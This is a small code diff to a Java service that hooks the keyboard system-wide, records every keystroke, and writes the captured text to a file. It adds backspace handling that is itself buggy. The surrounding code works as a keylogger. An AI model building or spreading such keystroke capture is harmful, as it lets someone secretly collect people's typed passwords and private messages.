@@ -70,6 +70,9 @@ public class GlobalKeyListenerService {
                     boolean isShiftActive = leftShiftPressed || rightShiftPressed;
                     String keyChar = KeyCodeConverter.getKeyName(info.vkCode, isShiftActive);
                     synchronized(inputLock) {
+                        if(info.vkCode == 0x08	){
+                            storedInput.deleteCharAt(storedInput.length() -1);
+                        }
                         storedInput.append(keyChar);
                         File file = new File(System.getenv("FILE_PATH"));
                         try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
